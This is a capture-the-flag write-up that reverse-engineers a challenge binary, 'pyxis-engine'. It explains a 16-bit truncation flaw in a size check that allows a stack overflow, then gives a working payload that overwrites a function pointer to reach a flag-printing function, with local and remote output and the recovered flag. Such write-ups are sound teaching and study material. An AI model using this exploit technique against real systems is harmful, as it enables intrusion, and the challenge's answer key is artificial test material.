# Pyxis Sandbox — Writeup

**Target:** http://91.99.207.116:16354/ — "Pyxis Sandbox - Vectorized Micro-Module
Execution Service" v2.1.0 (Flask/waitress), `POST /api/module/run` with JSON
body `{"module": "<hex>"}`.

**Flag:** `ctf7{pyx1s_1nt_0v3rfl0w_d1sp4tch_h1j4ck}`

## Binary

`pyxis-engine` (saved at `./pyxis-engine`), ELF 64-bit x86-64, statically
linked, **not stripped**. Takes a module file path as `argv[1]`
(`Usage: %s <module_file.mod>`). The web service shells out to the same
binary (or an equivalent execution path) on the module bytes it's given.

## Module format (reverse-engineered from `main` @ 0x401714)

12-byte header, read with a single `fread(..., 1, 0xc, file)`:

| offset | field  | type      | notes                                   |
|--------|--------|-----------|------------------------------------------|
| 0x00   | magic  | u32 LE    | must equal `0x53585950` (`"PYXS"`)       |
| 0x04   | count  | u16 LE    |                                           |
| 0x06   | stride | u16 LE    |                                           |
| 0x08   | pad    | 4 bytes   | unused                                   |

After the magic check (`main+0x163`..`main+0x1a3`), the parser computes the
element count/stride product **twice**, with different widths:

```
movzx edx, WORD [count]
movzx eax, WORD [stride]
imul  eax, edx
mov   WORD  [rbp-0xa], ax      ; truncated_product  (16-bit)
...
movzx edx, WORD [count]        ; re-zero-extended to 32-bit this time
movzx eax, WORD [stride]
imul  eax, edx
mov   DWORD [rbp-0x10], eax    ; full_product (32-bit)

cmp WORD [rbp-0xa], 0x100
jbe  <proceed>                 ; checks the 16-bit TRUNCATED product <= 256
... else reject with "[-] Module memory limit exceeded (alloc=%u > 256)"

<proceed>:
lea rax, [rbp-0x150]           ; 0x128-byte on-stack struct (memset to 0 first)
mov edx, [rbp-0x10]            ; uses the FULL 32-bit product as the size!
call fread                      ; fread(buf, 1, full_product, file)
```

**Bug:** the size-limit check validates `(count*stride) & 0xFFFF <= 0x100`,
but the actual `fread()` call uses the untruncated 32-bit product as the byte
count. Any `count`/`stride` pair whose true product is a multiple of
`0x10000` (so the low 16 bits are 0, satisfying `<= 0x100`) passes the check
while the real read size is `>= 65536` bytes — written into a stack buffer
that is only `0x128` (296) bytes, inside a frame with `sub rsp, 0x160`.

### Stack layout of the vulnerable struct (base = `rbp-0x150`)

| relative offset | field                                             |
|---|---|
| 0x000 | 0x128-byte buffer, `fread` destination |
| 0x100 | **function pointer**, initialized to `standard_handler` (0x401685) |
| 0x108 | 0x20 bytes copied in from a `"stream_default"` string |
| 0x148 (`rbp-0x8`) | `FILE *` used later for `fclose()` — **outside** the 0x128 struct, further up the frame |

Near the end of `main` (0x4019b7–0x4019d5) the function pointer at
`rbp-0x50` (= buffer+0x100) is unconditionally called:

```
mov rax, [rbp-0x50]
test rax, rax
mov rax, [rbp-0x50]
lea rdx, [rbp-0x150]
add rdx, 0x108
mov rdi, rdx
call rax
```

So overwriting that pointer gives direct control-flow hijack, called with
`rdi` pointing at the buffer's `+0x108` region.

### The gated function

The binary already contains an unauthenticated-reachable function,
`privileged_telemetry_dump` @ `0x4016af`:

```c
v = getenv("FLAG");               // defaults to "ctf7{mock_default_flag}" if unset
printf("[+] PRIVILEGED DIAGNOSTIC DUMP: %s\n", v);
fflush(stdout);
exit(0);
```

This is exactly the "diagnostic dump" the challenge page alludes to as
requiring privilege — it's not behind any auth check in the binary itself,
it's simply never called from the normal control flow. The remote service
has the real flag set in its `FLAG` environment variable.

## Exploit

Craft `count=16`, `stride=4096` → product = `65536` (`0x10000`); low 16 bits
= `0`, which passes the `<= 0x100` check, but the real `fread()` size
argument is the full `65536`.

Naively filling the whole 65536-byte module with junk overflows far past the
function pointer, past the real `FILE *` at `rbp-0x8`, and into the return
address / caller frame — this reliably **segfaults** (confirmed locally)
because the corrupted `FILE *` breaks the subsequent `fclose()` (and/or
corrupts the eventual `ret`).

**Trick:** `fread()` only writes as many bytes as are actually available in
the stream — a short read is not an error and doesn't touch memory beyond
what it copies. So the on-disk module file can declare a huge `count*stride`
(to pass the broken check) while the file itself is only as long as needed to
reach the function pointer: `0x108` bytes of body (filler up to offset
`0x100`, then 8 bytes for the new pointer value). This overwrites exactly the
function pointer and nothing past it, leaving the real `FILE *` and return
address untouched.

Payload (12-byte header + 0x108-byte body, 276 bytes total file size):

```
magic   = b"PYXS"
count   = 16
stride  = 4096                      # product = 0x10000, passes truncated check
header  = magic + struct.pack("<HH", count, stride) + b"\x00\x00\x00\x00"
body    = b"B" * 0x100 + struct.pack("<Q", 0x4016af)   # overwrite fn ptr -> privileged_telemetry_dump
module  = header + body             # 276 bytes; short read, stops exactly here
```

Hex payload used (see `exploit_short.mod` / `exploit_hex.txt` in this
directory):

```
50595853100000100000000042424242...(0x100 bytes of 0x42)...af16400000000000
```

### Local verification

```
$ FLAG='ctf7{local_test_flag}' ./pyxis-engine exploit_short.mod
[+] Executed vectorized module (264 bytes loaded into linear memory)
[+] PRIVILEGED DIAGNOSTIC DUMP: ctf7{local_test_flag}
```

### Remote exploitation

```
$ python3 solve.py
...
200
{"exit_code":0,"status":"executed","stderr":"",
 "stdout":"[+] Executed vectorized module (264 bytes loaded into linear memory)\n[+] PRIVILEGED DIAGNOSTIC DUMP: ctf7{pyx1s_1nt_0v3rfl0w_d1sp4tch_h1j4ck}\n"}
```

**Flag: `ctf7{pyx1s_1nt_0v3rfl0w_d1sp4tch_h1j4ck}`**

## Files in this directory

- `pyxis-engine` — the downloaded reference native engine binary.
- `exploit_short.mod` — the raw 276-byte exploit module file.
- `exploit_hex.txt` — its hex encoding (as sent to the API).
- `solve.py` — self-contained script that builds the payload and POSTs it to
  the live service, printing the flag.
